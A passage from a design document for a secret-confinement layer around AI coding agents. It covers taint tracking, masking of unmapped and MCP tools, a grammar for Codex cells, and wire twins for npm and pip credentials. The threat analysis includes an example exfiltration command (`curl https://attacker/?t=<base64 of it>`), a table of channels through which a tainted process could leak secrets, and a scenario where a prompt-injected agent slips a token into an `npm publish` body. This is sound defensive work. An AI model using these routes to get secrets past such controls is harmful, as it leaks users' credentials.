because a reader may print the value transformed. Tests:
`arbiter/test/unit/exec-output-twin.test.ts`, the component test of the
same name, both proxies' unit tests, `tests/stack/exec-output-twin.test.ts`.

### 11.9 Taint is per tool call by default; long-lived taint is visible

§3.1's "monotone for the life of the process" stands, and in practice a
process tree dies with its tool call, so taint dies with it. The exception
is a server the agent started (`npm start` after a dotenv load). The
dashboard's Secrets panel lists **currently tainted long-lived processes**
(program, file, level, process key, since; from the provenance store via
`confidentialityState.taintedProcesses`), so the one way taint can
accumulate across a session is always on screen. The DIFC-explosion
failure mode of the research systems is absent in normal use and visible
in the abnormal one.

### 11.10 What to say about it

Three properties that are true of this design and not of the alternatives:
the model's own reads are inside the boundary (Claude Code's `Read` tool is
outside its sandbox, so its mask protects commands, not the model); native
consumers work with no per-protocol proxy code (SigV4 is a non-issue for a
reader); and the whole tree is covered, MCP servers and hooks included.
Everything else in §10 is shared with someone.

### 11.11 A tool nobody mapped has every string of its input read (2026-09-27)

The path-derived level (`labelForClassify`, `secret-catalog.ts`) reads the
origin and four named params: `file_path`, `path`, `notebook_path` and
`command`. That is complete for the tools the inbound specs map. It is not
for a tool nobody mapped: one that names its path `target` or `files[0]`,
or a shell under another name (OpenClaw's `terminal`, a plugin's exec, an
MCP tool). Such a tool got no level, and in `secrets` mode a labeled file
(not a registered secret, which the guard serves as its twin) came back to
the model raw.

The rule, arbiter-side, confidentiality axis on: when the session's spec
has no exact entry for the tool (`inboundSpecNamesInput`,
`tool-inbound.ts`; Mandu's own inspect and policy tools count as mapped, an
`mcp__*` tool matching only the generic MCP fallback does not), every
string in its input at any depth, and every object key, is read as a Bash
command is: a path-like string classifies directly, other text is scanned
token by token for catalog and label hits, and a `file://` URL is read as
its path (`labelForUnmappedInput`). The result is the MAX with the
named-param verdict: raise-only. Past its bounds (depth 16, 4096 strings, 1
MiB of text) the scan returns `no-model`. Both proxies send the input's
HumanView copy (`paramsHuman`, confidentiality-only and never forwarded),
since a user label is keyed in HumanView and the agent echoes AgentView
paths. Cost: over-masking, a string that only mentions `.env` masks the
tool's result. A mapped tool is unchanged. One result is released past the
raise (2026-10-18): Mandu's `declassify_symbol` result when it is exactly the
value the arbiter released to that session, whose `reason` routinely names
the file being declassified; the watermark already carries that file's level
(model-endpoints.md §1.6).

`callTaint` is not part of this rule: it can LOWER the path-derived level
(the denied-only and twin releases, §11.8). The process leg for an
unmapped tool is §11.12, which only raises.

Tests: `arbiter/test/unit/unmapped-input-label.test.ts`, the component test
of the same name, the anthropic-proxy's `origin-humanview.test.ts`, and
`tests/stack/unmapped-tool-label.test.ts` (OpenClaw directly and through
`tool_call`, and a Codex MCP tool, over the real arbiter and the
production adapters; red with the rule disabled).

### 11.12 A tool that runs a command is checked against its process tree, mapped or not (2026-09-28)

§11.11 masks an unmapped tool by what its input NAMES. What a command READS
when it runs is the process leg (`callTaint`, §4.2). An unmapped tool whose
command reached a secret without naming it (a glob, `cd` then a relative
name) went unchecked. For a registered file that costs nothing, since the
guard serves every non-reader the twin; it matters for a listed reader,
whose output under rule (i) must reach the model as one symbol even
through an MCP `run_command`, a plugin's exec or an eval tool.

- **Every known shell is mapped.** Claude Code's `Monitor{command}` is in
  the Claude Code gate surface's `exec` and `execOutput`
  (`tool-gate-surface.ts`) and in the inbound spec at Bash's posture.
  Codex's `shell_command{command}` joins `exec_command`, `shell` and
  `local_shell` as an exec-shaped tool; `shell{command: [argv]}` reaches the
  arbiter as its argv, joined so the signature tokenizer splits it back.
  OpenCode's `bash` and OpenClaw's `exec` / `process` are mapped.
- **The backstop for the rest.** A tool that is not a mapped shell but
  whose input has a command-like top-level field (`command`, `cmd`,
  `commandLine`, `command_line`, `cmdline`, `script`, `shell`, `bash`,
  `code`, `argv`; a string or an argv array; the proxies'
  `unmapped-exec.ts`, one list pinned in both) is asked about with
  `callTaint{…, unmappedTool}`. A Codex freeform custom tool other than
  `apply_patch` (`js_repl`) carries its input as `code`. The arbiter
  answers only when the confidentiality axis is on and the session's
  inbound spec has no entry for the tool:
  - **the guard tied the command to a tree** (`evidence: "tree"`): that
    tree's fold, exactly as for Bash;
  - **no tree** (`evidence: "session"`): the tool may run its command
    in-process, through a program the guard never saw, or on another host.
    The level is the strictest of the session's `process_secret_taint`
    rows (`sessionSecretTaint`), under rule `secret`. A session in which
    nothing read a secret raw has nothing to mask.

  The answer only RAISES: the proxies never apply the denied-only or twin
  release to it. Both proxies take the MAX of the classify level and a
  taint level, so a taint can never lower a verdict.

Cost: in a session where a listed reader read a secret raw, every later
result of an unmapped command tool that the guard cannot tie to a tree is
masked whole. This is the fail-closed side, limited to unmapped tools.

**Background-output polls** carry no command:

- **Claude Code and OpenClaw.** `BashOutput` and `process` are mapped
  shells (`execOutput`) that name a task, not a command, so Plan 13 D7
  masks them whole at the session's level while the session holds a raw
  read. `TaskOutput` (Claude Code's poll of a background shell or agent) is
  a mapped shell in the Claude Code surface, asked with no command, masked
  like `BashOutput`. Cost: a `TaskOutput` of a background SUBAGENT is
  masked too while the session holds a raw read.
- **Claude Code's polls tied to their call (2026-10-09).** A `Bash` call
  with `run_in_background: true` answers at once with Claude Code's own
  text, `Command running in background with ID: <id>. Output is being
  written to: …` (the command's output goes to the task's file, so no
  command can write that result). The anthropic-proxy ties each
  `BashOutput` / `TaskOutput` poll of `<id>` (`task_id`, `bash_id` or
  `shell_id`) to the ONE such call of the request whose result STARTS with
  that announcement (`claudeBackgroundPolls`, read before the walk rewrites
  any result), and asks about the poll under that call's id and command:
  its tree decides, raise-only (no denied-only or twin release), exactly as
  Codex's `write_stdin` below. Why that tree is the whole story: a poll's
  bytes are the task's output file, which Claude Code opens and reads back
  at each poll. A reader in the task's own tree taints that tree; a holder
  of ANOTHER tree that writes into the file labels it at its write-intent
  open (Plan 13 §4.5, D5), and the agent is then served the file's twin
  (Plan 13 §3 D4, the twin's descriptor), so the poll carries no raw byte of
  it. Any doubt leaves the poll untied, asked with
  no command (the session decides, as before): no announcing call in the
  request (compacted away, or a background subagent), the call not started
  in the background, the announcement not at offset 0, or ANY other result
  of the request mentioning the id in any announcement spelling (`in
  background with ID:`, `backgrounded by user with ID:`, `moved to the
  background (ID:`), so a command or a file printing a forged announcement
  can only make a poll untied, never tie it to a clean call. Residual: a
  Claude Code that ignores `run_in_background` (background tasks turned
  off) runs the command in the foreground, so its output could start with
  a forged announcement; it then has no real task of that id to poll, and
  a second claim of a real id still unties. A tied poll's masked output
  counts in the value backstop by that call's tree (the ask names the poll,
  `forPoll`; Plan 13 §3 D7, *A background poll's output as evidence*). Test:
  `interceptors/anthropic-proxy/test/unit/background-poll.test.ts`,
  `tests/stack/claude-background-poll.test.ts`.
- **Claude Code's background output file.** `run_in_background` hands the
  task's output file to the shell as its stdout and stderr, and the model
  reads it with `Read`. A reader in that shell writes into the file it
  holds open, so Plan 13 D5's taint-time sweep labels it and the `Read`
  result takes the label (`tests/sandbox/guard/call-tree.test.ts`).
- **Codex `write_stdin`.** An `exec_command` still running when it yields
  says `Process running with session ID <n>` in codex's result head (before
  `Output:`, so a command's own output cannot claim one), and
  `write_stdin({session_id: n})` polls or types into it. The openai-proxy
  ties each poll to the ONE exec call of the request whose head started
  session n (`buildCorrelationMap`, `runningSessionId`); that call's process
  leg decides, raise-only. A poll no exec call accounts for, or one two
  calls claim, is asked as `unmappedTool: "write_stdin"`, and the session
  decides.

Since 2026-10-17 a labeled file the launch did not register is no longer
known only by its name: one past the discovery walk's limits, or under a
label set mid-session, is registered (the label roots,
`secret-discovery.md` §1.11), and the guard gates the opens of one created
after the launch under a label as a derived file's (plan 13 D4), so a
tool's process leg sees it and the twin's registration arms the value
backstop. Still open: in the `gated` posture there is no guard, so there
are no trees and no session rows, and a file created under a label after
the launch is known there by its name only.

Tests: `arbiter/test/unit/unmapped-exec-taint.test.ts`, the component test
of the same name (tree, session, a mapped tool, axis off), each proxy's
`unmapped-exec` unit test and `unmapped-exec-taint` component test (the
background polls), the openai-proxy's `runningSessionId` unit test, and
`tests/stack/unmapped-exec-taint.test.ts` (both proxies over the real
arbiter and the production adapters, with the guard's records written as
the guard writes them; red with the backstop disabled).

### 11.13 A Codex cell that only calls one MCP tool is that tool (2026-10-02)

> Two sections carry the number 11.13: this one (with §11.13.1) and "Twins
> the reading program still parses" below (with §11.13.2 and §11.13.3).
> Both are cited, so neither is renumbered.

**Status: BUILT.** Confidentiality axis only.

**The observation.** Codex's code mode wraps every nested tool call in a
JavaScript cell, the `exec` custom tool (`supported-agents.md §6`):
`text(await tools.mcp__mandu_policy__mandu_policy_read({}))`. The
openai-proxy names a cell by the `tools.exec_command({…})` literal it finds;
a cell with none was classified as an unknown tool whose input is
JavaScript (§11.11), so after an `rg` that named `.env` the model's
discovery cell came back masked and it never found the policy tools. A
utility loss on the tool that asks for protection. Two leaks were found
while designing the fix, both needing a listed reader to have read a secret
raw, both closed (raise-only): a cell running a reader in a form the
literal scanner misses (`tools["exec_command"]`, an alias) was treated as a
mapped shell and never asked about the session, and a namespaced Codex MCP
call was forwarded on a trusted verdict before the process leg was asked.

**The rule.** A cell qualifies, and is classified exactly as the namespaced
`function_call` to the same tool, when ALL hold:

1. **The cells are isolated.** The request's own `exec` description says
   each cell runs in a fresh V8 isolate (codex 0.159.1), so `tools`, `text`
   and `JSON` are the host's own. A codex that drops the sentence turns the
   rule off (fail-closed). Only `exec` qualifies, never `js_repl`.
2. **The source parses under an allow-list grammar** (`mcp-cell.ts`;
   anything not named refuses): ASCII identifiers, the punctuators `( ) {
   } [ ] . ?. , : ; =`, quoted string literals with JSON-style escapes,
   decimal numbers, `true`/`false`/`null`, comments and plain whitespace;
   the statements `const NAME = CALL`, `CALL` and `text(EXPR)`, where
   `CALL` is `await tools.NAME(OBJECT)` (or `tools["NAME"]`) with NAME an
   `mcp__<server>__<tool>`, `EXPR` is the call, a bound name with
   `.name`/`[N]` steps, or `JSON.stringify` of one; `OBJECT` a pure
   literal (no computed, shorthand or `__proto__` keys, no identifiers,
   spreads, methods or templates); **exactly one `CALL`**; a member step
   that any JSON value's prototype defines (`constructor`, `toString`, …)
   refuses.
3. **Classification**: the correlation map names the call
   `mcp__<server>__<tool>` with the parsed object as arguments, so every
   name-keyed arbiter rule applies as to the namespaced call.

Why it cannot widen what reaches the model: an isolated cell under the
grammar outputs the envelope plus a rendering of the ONE tool's result, the
datum the namespaced call returns, with that call's verdict; it cannot add
another source (no second call, no `load`, no `exec_command`, no other
global, no call on a value). What its source names stops masking the
result, because the source is the model's own text. A cell with two calls
does not qualify. The bare `text(ALL_TOOLS)` listing qualifies as the tool
battery (already in the request), with no `callTaint` ask.

**The filtered listing (2026-10-07, codex-cli 0.160).** Codex 0.160 leaves
deferred MCP tools (Mandu's policy tools among them) out of the `exec`
description and tells the model: "To find one, filter `ALL_TOOLS` by `name`
and `description`". The model's search is therefore a cell like
`text(JSON.stringify(ALL_TOOLS.filter(t => /mandu|policy/i.test(t.name + " "
+ t.description))))`, which the grammar refused, so in a session with a raw
read the §11.12 backstop masked it whole: the model reported "the
tool-discovery result was hidden from me" and never called the policy tools
(the 0.160 tour). The grammar now takes a listing with steps:
`ALL_TOOLS` (or the cell's one `const` bound to a listing) followed by
`.filter` / `.find` / `.findIndex` / `.some` / `.every` / `.map` with one
arrow function, `.slice(INT, INT)`, `.join("sep")`, `.length`, `[N]` and the
entry fields `name` / `description`. An arrow has one parameter and an
expression body built only from that parameter, literals (strings, numbers,
`true`/`false`/`null`, templates whose holes are such expressions, object
and array literals with plain keys), `||` `??` `&&` `!`, one comparison,
string `+`, the pure string readers `toLowerCase` / `toUpperCase` / `trim` /
`includes` / `startsWith` / `endsWith` / `indexOf`, and a regular expression
literal's `.test(…)`. No other name, global or call. The tokenizer reads a
`/` as a regular expression only where JavaScript does (after an operator
or an opening bracket; never after a name, a literal or a closing bracket,
where it refuses), ends it where ECMAScript's lexical grammar does (escapes,
classes), refuses the `v` flag and anything V8 would not compile, and
tracks template holes by brace depth, so it and V8 split the source the same
way.

Why it cannot widen what reaches the model: every value such a cell outputs
is computed by pure built-ins from `ALL_TOOLS` and the cell's own literals,
so it is a function of the bare listing, which already qualifies. In an
isolated cell nothing earlier redefined a built-in (precondition 1), and the
grammar has no assignment. `ALL_TOOLS` holds the deferred tools' metadata
as their servers advertise it; the classic wire hands the same entries to
the model in codex's `tool_search_output`, which the proxy forwards as it
is. A listing-shaped cell that reads anything else (`load`, a tool, a second
binding) still refuses and keeps the fail-closed handling (unit:
`mcp-cell.test.ts`; component: `mcp-cell-wire.test.ts`; stack:
`codex-mcp-cell.test.ts`; the real codex 0.160 against a scripted model:
`codex-policy-tools.test.ts`).

**Three more paths, closed** (each only adds masking or blocking):

- **(a) A second exec the scanner never sees.** A cell is *exact* when the
  grammar identifies every call and finds exactly one `exec_command` equal
  to the first literal. Any other cell with an exec literal also folds in
  the session (`callTaint{unmappedTool: "exec"}` under `<id>#cell`), with
  no release; on the response side a cell whose calls the grammar cannot
  all identify goes to the whole-cell exec gate first, and a block replaces
  it by the sentinel cell.
- **(b) `wait`.** A yielded cell's later output comes back through `wait
  {cell_id, …}`, with no command. A `wait` is tied to the cell that
  yielded it (its tree re-read now; the cell's arguments classified beside
  the wait's); an untied `wait` is asked as an unmapped tool. A `wait`
  never takes a release.
- **(c) An MCP server as a store.** A cell can write a reader's output into
  an MCP tool's argument at run time and read it back later with no
  command. Every MCP result is therefore asked about as `unmappedTool` with
  no command; the arbiter answers empty for Mandu's own tools (policy,
  inspect, declassify), and otherwise the per-server rule below decides.

**MCP command tools meet the exec gate.** An MCP tool whose input carries a
command-like field (the §11.12 list) is submitted to `execGate` exactly as
a shell command (`gateCommandLikeToolUse` on Claude Code;
`gateFunctionCallArguments` for every Codex `function_call`; an identified
cell field by field). On a block, no answer, or a value the gate cannot
read, every command-like field becomes the block sentinel; a boolean or
number under such a key is a flag, not a command.

**The per-server MCP rule (both wires).** An MCP result is masked whole
when the SERVER's own process tree read a secret raw.

- **Registration**: the launcher reads the agent's MCP config BEFORE the
  agent starts (`launcher/src/mcp-server-config.ts`: Claude Code's
  `.claude.json` and `.mcp.json` for the human and AgentView directories,
  the managed MCP file, installed plugins' servers, `--mcp-config`; Codex's
  `config.toml` and `-c mcp_servers…`), stdio servers only, and sends
  `registerMcpServers` on the arbiter's HUMAN socket. Registration is
  add-only, so a config the agent edits cannot point a tainted server at a
  clean look-alike.
- **Identification**: the arbiter keeps every exec argv the guard records
  (`exec_argv`); the server is the process whose argv is exactly its
  configured command line.
- **The answer** (`mcpServerTaint`): `tainted` when any process carrying
  the argv has a tree with a raw read; `clean` when exactly ONE does and
  its tree has none; `unmapped` otherwise (an HTTP server, never spawned,
  two candidates, an ambiguous name, the axis off); `own` for Mandu's
  tools.
- **Enforcement**: `tainted`, or an unreadable answer, masks whole.
  `clean` is not asked about the session. `unmapped` and `own` take **rule
  (c)**: asked `callTaint{unmappedTool}`, and a session answer masks the
  result whole with the note "`<tool>` is an MCP server whose state Mandu
  cannot see, and programs in this session read `<files>` raw". A server
  Mandu cannot map has no tree that could witness what it holds (a remote
  server, a connector, a store), so the session is the only fail-closed
  answer.
- **MCP resource tools** (Claude Code's `ListMcpResourcesTool`,
  `ReadMcpResourceTool`; Codex's `list_mcp_resources`,
  `list_mcp_resource_templates`, `read_mcp_resource`, `isMcpResourceTool`)
  name their server in the model's own text, so they are always asked
  about the session; since §11.18 every one, renamed or not, is masked whole (no mapping). In Codex's code mode they are nested tools of a cell
  that does not qualify, so the cell form is asked whatever the name,
  and since 2026-10-11 also about each resource tool it may call, as the
  direct call is (§11.18, "A cell's resource tools").

Rule (c) was first measured too costly on Claude Code: on a JavaScript
developer's host every `npm` command, `gh`, `docker`, `ssh` with a
default-named key and every `npx`-started MCP server tainted the session,
so every MCP result would have been masked. The per-server rule and the npm
wire twin (§11.13.1) removed most of that cost, and the rule holds on both
wires.

*Utility cost.* In a session where some program read a secret raw, and for
the rest of it, these reach the model as one symbol each (the human reads
them through the reply filter; `inspect_symbol` can process them): every
remote MCP server, including connectors; every stdio server Mandu could
not map (added after the launch, another argv, two copies); every MCP
resource listing and read. Not masked: a server proven clean, Mandu's own
tools, a session with no raw read. No switch turns it off; naming a stdio
server in the agent's config before the launch keeps it raw.

A server whose config changes after the launch, a renamed resource tool and
the agents whose MCP tools carry no prefix (OpenCode, Goose): §11.17 and §11.18. Still
open: on Codex a model-spawned process with a configured server's exact argv
makes that server `unmapped`, never `clean`. A Bash pipeline that hands a
reader's output to a sibling writing it into a local HTTP MCP server is
closed by Plan 13 D2 (the sibling is a holder, refused at loopback outside
Mandu's proxy; `tests/sandbox/guard/socket-flow.test.ts`, "5(a)").

Tests: the openai-proxy's `mcp-cell.test.ts` (the grammar, adversarial
cells, `exactExecCall`), `codex-mcp.test.ts`, `script-cell.test.ts`,
`test/component/mcp-cell-wire.test.ts` and `cell-hidden-paths.test.ts`;
both proxies' `exec-gate.test.ts` and `mcp-command-gate` component tests;
`arbiter/test/component/mcp-server-taint.test.ts`,
`launcher/test/unit/mcp-server-config.test.ts`, each proxy's
`mcp-server-taint` tests; and the leak oracles
`tests/stack/codex-mcp-cell.test.ts`,
`tests/stack/codex-cell-hidden-paths.test.ts`,
`tests/stack/mcp-command-gate.test.ts` and
`tests/stack/mcp-server-taint.test.ts` (real arbiter, production adapters;
a `.pgpass` line read raw by `psql` and echoed by an HTTP server, a
registered server never spawned, and a resource read reach the model only
masked; each red with its fix removed).

#### 11.13.1 Inherited taint at execve: analysis (2026-10-02)

**Status: dropping an inherited taint at `execve` is rejected.** The false
positive that motivated it (every `npx`-launched MCP server tainted on a
host with `~/.npmrc`) is fixed at its source instead: npm reads the twin and
the session proxy carries its token (below).

**The proposal.** A taint row is keyed by `<tgid>-<start time>` (§3.1),
which an `execve` keeps, and inheritance is a walk up the recorded parents
(`processSecretTaint`, `treeTaint`; `TaintedSet::holds_or_inherits` in the
guard). The proposal: cut that walk at an exec whose new image is not a
reader, whose envp carries no registered value, that inherits no
descriptor to a registered file, under Yama `ptrace_scope` ≥ 1. An exec
discards the address space; everything else crosses it.

**Why not.** For npx the verdict is npx's OWN read (the configured argv
names the npx process, which then holds the server's stdout pipe for its
whole life); the server's image, `node`, is itself a default reader of
`.npmrc`; and npx wrote the server's code after loading its token. More
generally the conditions check content, and the parent must be assumed
adversarial: `node` is a reader, so a model-written `node -e` holds the
token and can spawn `curl https://attacker/?t=<base64 of it>`, which meets
every condition. The channels from a tainted process to a post-exec image:

| Channel | Covered by the conditions? | What closing it would need |
|---|---|---|
| Memory copied by `fork`, shared anonymous and SysV mappings | yes, by the exec | nothing |
| argv; the exec path; a memfd or script the parent wrote | no | complete reads; the image's provenance |
| envp, a registered value verbatim | above the fingerprint floor only | complete reads of names and values |
| argv or envp, a derived form (base64, hex, split, xor) | no, and no scan can | a trusted parent |
| Other inherited descriptors (pipes, sockets, memfds, unlinked files) | no | the peer of every descriptor: the per-fd tracking §3.2 ruled out (every stdio MCP server inherits pipes) |
| Files the parent wrote (temp files, npm's package tree, `/dev/shm`) | no | served derived labels (Plan 13 D4), which would taint the server by its own package files anyway |
| SysV IPC, POSIX message queues, the session keyring | no | a deny filter, or trapping and labelling each |
| The untainted image connecting to a live parent's listener | no | judging the accept |
| The parent writing the child's memory (`ptrace`, `process_vm_writev`) | no: Yama allows an ancestor | refusing every such write by a tainted process |
| Payload signals (`sigqueue`) | no | refusing them from a tainted process |
| The child reading the parent; the tainted side connecting | yes, by the guard (§4.1, §4.3) | — |

Own rows survive every exec anyway (`bash` sourcing `.env` then `exec curl
-H "$KEY"`), so the asymmetry has no basis. Stricter versions were
considered and rejected: only after the parent exits (npx never does), only
when the parent is IPC-confined (the per-fd design, and files stay open), a
per-file-class rule (`node` runs any script), an npm-specific vouch (makes
an interpreter-hosted program a declassifier, which §2.3 refuses).

**The fix instead: npm reads the twin.** npm sends its `.npmrc` token as a
header the session proxy can put back (`confidentiality-plan-13-reader-set-labels.md §10`), so npm
needs no raw byte. Measured first with the real launcher, guard and
inspecting proxy, a fake HTTPS registry and codex with two stdio servers:
with the wire twin, npm 9, 10 and 11 left both servers `clean`, no taint
row, the registry got the real `Bearer` token, and the canary never reached
the agent's output; with it off the npx server was `tainted`.

1. **The extractor** (`extractNpmrc`) marks a value `wire: {host, scheme}`
   when npm sends it verbatim to the registry its own key names
   (`//host/:_authToken`, Bearer; `:_auth`, Basic); never an unscoped key.
   `npmrcProxyBypassKeys` lists the keys that route npm around the proxy or
   its CA (`proxy`, `https-proxy`, `noproxy`, `ca`, `cafile`, `cert`, …).
2. **The binding** (`registry.ts` `mintFields`): only for the launch
   HOME's own wire files (`isHomeWireFile`; never a workspace copy,
   §11.6), each marked field symbol is bound to its host.
3. **Servable** (`wireServableTwin`): every span marked and bound, no
   bypass key, no registry in the session's `NO_PROXY`.
4. **The session's word** (`registerWireRelease`, HUMAN plane only): sent
   when the confidentiality axis is on and the egress proxy terminates TLS;
   `MANDU_WIRE_TWIN=0` in the launcher's environment skips it. Kept across
   an arbiter restart while its launcher runs (2026-10-17,
   `wire-release-sessions.ts`, table `wire_release_sessions`, mandu.db v17):
   the launcher sends its pid with the word, the arbiter keeps it in memory
   and writes the session key, the session's `NO_PROXY` hosts, the pid and
   the pid's start time (no value), and a restarted arbiter takes back the
   words whose launcher still runs (same pid, same start time, the
   auth-grant liveness test). The session's end withdraws it (the
   launcher's `inspecting: false` with its pid, which drops only that
   launcher's word); a gone launcher's row is not taken back and is pruned
   at the next write. Until then the word lived in memory only, so a
   restart under a live session sent npm back to the raw read until the
   next launch: the fail-closed direction (npm and its `npx` servers then
   hold the token as confined readers, their output masked, their sends
   held to the registry), at the cost of the clean servers the twin is for.
   A word sent without a pid, or whose pid the arbiter cannot see, stays in
   memory only, as before.
5. **The open decision** (`decideOpen` `wireTwin`): a known consumer of a
   servable file (`npm`, `yarn`, `pnpm`, `node`) gets the twin, listed or
   not, and no taint is recorded. `ask: always` keeps prompting.
6. **Codex's MCP servers get the proxy** (`codexMcpProxyEnvOverrides`):
   Codex drops `HTTPS_PROXY` and kin for an MCP server unless its
   `env_vars` names them, so the launch adds them per configured server.
   An unmapped server's npx sends the token's SYMBOL to the registry (no
   leak; a private package fails with a 401).
7. **`others: twin`** on a reader list serves a known consumer the twin
   under `secrets-ask = known` instead of holding it.

Effect: npx's `node` holds no raw byte, so npx servers are `clean` and
`npm` in a Bash call is not masked; the token exists only in requests to
its own registry. Residuals: an unscoped token, a bypass key or a
`NO_PROXY` registry keep `node` a raw reader; `npm login` and `config set`
write into the twin and are lost (the launcher names the file when the
session ends, §4.1); the open decision judges a catalog path by the
arbiter's HOME and, since 2026-10-17, by the launch's HOME its launcher
recorded on the human plane (§11.13, "The launch's HOME").

**The wire twin for passwords: npm's `_password` and a pip index.** npm
decodes `//host/:_password=<base64>` and sends `Basic
base64(username:password)`; pip splits `index-url =
https://user:PASS@host/simple` and sends the same. Both read the twin, so
each gets a placeholder it can carry:

1. **The encoding the program decodes** (`SecretSpan.encoded`): `base64`
   (npm's `_password`) or `percent` (a `pip.conf` URL's user or password).
   The span's value is the DECODED secret, and the twin writes the same
   encoding of the token, so the program decodes it back into the exact
   token. Every `pip.conf` URL credential is percent-encoded, because
   Python 3.14's `urlsplit` refuses a raw token's brackets.
2. **Marks and bindings**: a scoped `_password` on a plain host; the
   credentials of a `pip.conf` `index-url`/`extra-index-url` (the HOME's
   `~/.config/pip/pip.conf` or `~/.pip/pip.conf`) and of `PIP_INDEX_URL` /
   `PIP_EXTRA_INDEX_URL`. An unbound `<field>.encoded` row keeps the file's
   encoded text a fingerprint too.
   **An IPv6-literal index** (2026-10-17, `indexWireHost`):
   `https://user:PW@[2001:db8::1]:8443/simple` and `http://u:p@[::1]/simple`
   are marked like a named host. The wire host is the bracketed address in
   its canonical text (RFC 5952: lower case, the longest zero run
   compressed, so `[2001:DB8:0::1]` is `[2001:db8::1]`) with the port as a
   number; a zone id (`[fe80::1%25eth0]`, which names an interface, not an
   address), a bare address without brackets and anything that does not
   parse get no mark (masked, never put back). The binding rule
   (`host-bindings.ts`, both copies) compares IPv6 addresses in the same
   canonical text and lets a zone id, as a binding or a destination, match
   nothing. The net-proxy writes a CONNECT target's address canonically
   (`parseConnectTarget`), so the gate judges the address the proxy dials,
   whatever spelling the client used; it dials the address bare (Node looks
   a bracketed literal up as a name, which failed: no IPv6-literal request
   through the proxy had ever gone out), sends it no SNI and verifies it
   against the certificate's IP entry, and the inspecting leaf for it
   carries an IP entry, not a DNS name. A `:port` right after an address's
   `]` is no bare-token piece of the file (`locateBareSecretTokens`: the
   brackets split the URL, and `:8080/simple` tripped the fingerprint
   tripwire on every plain-HTTP request to that port and path).
   **The grant's port is the release's port** (2026-10-17): a wire host
   with a port (`[2001:db8::1]:8443`, `registry.example:8443`) releases at
   that port only, one without at every port of its host (confidentiality.md
   §2.2, "The port"). The net-proxy states every destination with its port
   (`destination.ts`): the inspected leg and the blind tunnel the CONNECT
   target's, to the gate and to the tripwire; the plain leg the URL's or the
   scheme's default. Until then the inspected leg stated the CONNECT host
   alone, which the binding rule reads as "no port said", so the password
   granted to `:8443` was also put back at `:443` of the same host. The
   human's answers stay keyed by host less a default port
   (`approvalDestination`, confidentiality.md §2.2), so an answer given at
   `host` (a model proxy's pre-check, or an earlier answer) still applies at
   `host:443` and `host:80`, and one at `host:8443` only there.
3. **The proxy decodes Basic** (`egress.ts` `basicCredential`): a symbol in
   the decoded pair of an `Authorization: Basic` header is decided per
   destination; anywhere else, an unbound symbol or an unreachable arbiter
   blocks the whole request (403, nothing forwarded). Allowed, the proxy
   substitutes the value and re-encodes.
4. **The model boundary** (`encodedTwinTokens`): encoded tokens also name
   their file for the exec-output twin rule (§11.8); the substring test
   still decides.

Measured with pip 25.1.1 on Python 3.14 through the real NetProxy: the
index got the real password on every request.

**HTTPS only.** A wire-twin credential is put back only in a request on the
scheme its own declaration names (pip: the URL's scheme; npm: https unless
the same file declares that registry `http://`). The scheme is derived from
the field's own file version (`wireReleaseScheme`; an unknown field answers
`https`), the net-proxy states the leg's scheme on each request, and an
`https` credential in a request not stated HTTPS is a hard refusal
(`wireSchemeRefusal`, `egress:secret-https-only`, before any standing human
verdict). The rule reads the row the gate's lookup resolves the token to
(the candidate walk, as `resolve` does): until 2026-10-09 it read the exact
name, so a mutated token (`<field>.x`, which the walk takes back to the
field) skipped it and the real token went out over plain HTTP. Every
`network` ask is judged, whether or not it says the value would run as a
command (`asCommand`, 2026-10-10: the rule exempted such an ask, which then
reached a standing verdict and was released over plain HTTP; no caller
sends `asCommand` at the network boundary, so nothing that works changes).

**The Authorization header only (2026-10-09).** The net-proxy used to put a
released value back wherever its placeholder sat: the URL, the body and
every header. For the bindings above that was a release nobody chose: with
default settings an injected agent could put the HOME `.npmrc` token's
placeholder in an `npm publish` document (its `readme` or `description`,
plain JSON strings in the PUT body) and the proxy sent the registry the real
token to publish, with no prompt; a pip index that keeps what it is sent
likewise. npm, yarn, pnpm and pip send these credentials only in the
`Authorization` header (Bearer, or the Basic pair the proxy decodes), so:

1. **Where each symbol sits.** `requestSymbolPositions` (egress.ts) records
   every position of each symbol: `authorization` (the `Authorization` value
   or its decoded Basic pair, never `Proxy-Authorization`), `url` (the URL or
   the host), `header` (any other header), `body`. Each
   `desymbolizationDecision` carries the set as `positions`.
2. **Automatic versus declared bindings** (current-bindings.ts
   `releaseRestsOnWireGrant`): the release at this destination rests only on
   a binding Mandu added itself when the destination matches none of the
   hosts the user declared: for a registered file's row, its path's label
   `bindings:` now; for a masked variable's row, its `env.sources` /
   `models[].token_env` hosts (none handed over ⇒ none declared,
   fail-closed); for any other row (a split, a copy whose origin is the
   symbol, a recorded join), when any row it was made from is automatic
   there. The row is the gate's own (the candidate walk), so a mutated token
   answers as the row it resolves to. The wire grant of the HOME `.npmrc` /
   `pip.conf`, a pip index variable's own host and an agent key's auth
   grant (agent-sign-in.md §3) are automatic; `~/.git-credentials` gets no
   automatic binding at all (no `wire` span; a binding for it is a label's).
   An obsoleted row of a registered file takes the same label test
   (2026-10-10): rule 1 no longer keeps its bindings, so they stay frozen
   with the wire grant's host in them, and it refers to nothing, so it and
   a copy whose only parent it is used to read as the user's binding.
3. **The rule** (`wirePositionRefusal`, `egress:secret-wire-position`):
   such a credential is put back only when every position is
   `authorization`; any other position, none stated or a word the gate does
   not know is a hard refusal (nothing queued), composed in `decideDesym`
   beside the scheme rule, before any standing human verdict, so an earlier
   *Always allow* at the registry cannot carry the token into the body.
   Every `network` ask is judged, whether or not it says the value would
   run as a command (`asCommand`, 2026-10-10: copied from the scheme rule,
   which has dropped it too, it exempted such an ask, which then reached
   the standing verdict). The
   proxy withholds the whole request (403), as for every refusal. The model
   proxy's key put-back states `authorization` (it writes the auth header
   alone); its network pre-check and the Rust net-supervisor state none, so
   such a credential is refused there.
4. **Whole tokens.** The proxy substitutes a value only for a whole token
   the symbol grammar matches (`substituteTokens`), the same tokens the
   positions were taken from: `<token>` allowed in the header is no longer
   spliced into a longer token `<token>Z` in the body (unknown to the table,
   so allowed as a no-op), which a literal replace turned into the real
   token followed by `Z`.

A binding the user declared for the same row keeps the whole-request
release: a label's `bindings:` and `env.sources` hosts are standing release
rules for the datum wherever it sits, which the document-store and form-body
uses of §3.2 rely on (the live proof below posts a field in a form body).
Limiting those to credential positions, with an approval or an opt-out for
the rest, changes the binding contract and is a maintainer decision; until
then the user docs say a bound host receives the value anywhere in the
request (guarantees.md §3).

Residuals: a password that does not decode to UTF-8 text, a token in an
index URL's path or query (masked, not released), an IPv6-literal `.npmrc` registry
(no wire mark, so no wire twin),
`find-links`, `~/.netrc` and keyring credentials. A URL password anywhere
